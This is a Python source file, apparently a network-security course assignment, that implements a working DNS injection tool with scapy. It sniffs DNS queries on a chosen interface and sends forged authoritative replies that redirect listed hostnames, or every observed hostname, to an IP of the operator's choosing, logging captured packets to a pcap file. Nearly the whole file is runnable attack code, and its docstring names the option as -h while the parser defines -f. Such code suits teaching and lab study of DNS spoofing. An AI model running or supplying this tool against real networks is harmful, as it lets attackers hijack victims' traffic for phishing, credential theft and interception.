'''
This file can be run by the following command:

>> python dnsinject.py [-i interface] [-h hostnames]

-i: Listen on network device interface (e.g., eth0). If not specified, your program should select a default
interface to listen on. The same interface should be used for injecting forged packets.

-h: Read a hostname file containing a list of IP address and hostname pairs specifying the hostnames to be hijacked.
If ‘-h‘ is not specified, your injector should forge replies for all observed requests with the local machine’s IP address as an answer.

'''

# TEST: dig @1.1.1.1 foo1234.example.com
import argparse
import signal
import sys
import netifaces
import socket
from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, Ether, send, wrpcap

def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    if captured_packets:
        print("Saving captured packets to file...")
        wrpcap('injection.pcap', captured_packets)
        print("Saved captured packets to 'injection.pcap'.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

captured_packets = []


def main():
    parser = argparse.ArgumentParser(description='DNS Injector')
    parser.add_argument('-i', '--interface', default=None, help='Network device interface (e.g., eth0).')
    parser.add_argument('-f', '--hostnames', default=None, help='File containing IP address and hostname pairs.')
    
    args = parser.parse_args()
    print("Arguments: {}".format(args))

    # Set the default interface if none is provided
    if args.interface is None:
        args.interface = get_default_interface()
    print(">>> Interface set: {}".format(args.interface))

    # If hostnames file is provided, read it
    if args.hostnames:
        hostnames = read_hostnames_file(args.hostnames)
        print('>>> Hostnames set: {}'.format(hostnames))
    else:
        hostnames = {}
        print(">>> No hostnames file provided. All requests will be intercepted.")

    print("--------------------------------------------------------------")
    # Start packet capturing and DNS injection

    try:
        sniff(iface=args.interface, filter="udp and port 53", prn=lambda packet: process_packet(packet, args.interface, hostnames), store=0)
    except Exception as e:
        print(f"An error occurred: {e}")

def process_packet(packet, interface, hostnames):
    '''
    Process each intercepted packet, log it, and if necessary, forge a DNS response.
    '''
    global captured_packets
    if packet.haslayer(DNSQR):  # Check if the packet has a DNS Question Record
        query_name = packet[DNSQR].qname.decode()
        
        dns_type = packet[DNSQR].qtype
        dns_id = packet[DNS].id
        domain = packet[DNSQR].qname.decode("utf-8")
        domain = domain[:-1]

        # If we want to intercept this domain, generate a fake response
        if str(domain) in list(map(str, hostnames.keys())) or not hostnames:
            if packet.haslayer(Ether):
                src_mac = packet[Ether].src
                dst_mac = packet[Ether].dst
                print(f'Source MAC Address: {src_mac}')                 # Wireshark: eth.src == ff:ff:ff:ff:ff:ff
                print(f'Destination MAC Address: {dst_mac}')            # Wireshark: eth.dst == ff:ff:ff:ff:ff:ff

            print(f'Intercepted DNS Request for: {query_name}') # Wireshark: dns.qry.name == "example.com"
            print(f'DNS Request Type: {dns_type}') # Wireshark: dns.qry.type == 1 (For A records. Replace '1' with the relevant type number)
            print(f'DNS Transaction ID: {hex(dns_id)}') # Wireshark: dns.id == 0x1a2b
            print(f'Packet domain: {domain}')  
            #print(f'Packet Summary: {packet.summary()}')
            #print(f'Packet Details:\n{packet.show()}')  # Uncomment if you want a detailed view of the packet
            if packet.haslayer(IP):
                print(">>> Sending fake response to: {}".format(packet[IP].src))
                captured_packets.append(packet)
                send_fake_response(packet, interface, hostnames)
            print("##############################################################")


def send_fake_response(packet, interface, hostnames):
    domain = packet[DNSQR].qname.decode("utf-8").rstrip('.')
    print(">>> Domain: {}".format(domain))
    if hostnames:
        ip_address = hostnames[domain]
    else:
        # get local machine's IP address
        ip_address = socket.gethostbyname(socket.gethostname())
    print(">>> IP address of selected domain: {}".format(ip_address))

    # Build the DNS response
    # Network layer
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
    print(">>> src IP: {}".format(packet[IP].dst))
    print(">>> dst IP: {}".format(packet[IP].src))
    # Transport layer
    udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
    dns = DNS(  id=packet[DNS].id, # match query ID
                qr=1, # 1 to indicate it is a response
                aa=1, # to indicate the responder is an authoritative nameserver
                qd=packet[DNS].qd, # domain name being queried (copy it from the request)
                an=DNSRR(
                    rrname=packet[DNS].qd.qname,
                    ttl=23,
                    rdata=ip_address)) # the answer section which contains the answer to the query))

    fake_response = ip / udp / dns
    
    try:
        send(fake_response)
        print(">>> Fake response sent: {}".format(fake_response.summary()))
    except Exception as e:
        print(">>> Error sending fake response: {}".format(e))


def get_default_interface():
    '''
    Return the default network interface.
    Default interface is the interface with the default route.
    '''
    interfaces = netifaces.interfaces()
    print("Possible interfaces:", interfaces)

    if interfaces:
        gateway_info = netifaces.gateways()
        default_gateway = gateway_info['default']
        if netifaces.AF_INET in default_gateway:
            return default_gateway[netifaces.AF_INET][1]
        else:
            raise Exception("No IPv4 default gateway found")
    else:
        raise Exception("No network interfaces found")

def read_hostnames_file(filename):
    '''
    Read a hostname file containing a list of IP address and hostname pairs specifying the hostnames to be hijacked.
    Return a dictionary of hostnames and their corresponding IP addresses.
    '''
    hostnames = {}
    path = '/Users/dre/Desktop/NetSecurity/homeworks/cs468/hw3/' + filename
    with open(path, 'r') as file:
        for line in file:
            ip, hostname = line.strip().split(',')
            hostnames[hostname] = ip
    return hostnames


if __name__ == "__main__":
    main()
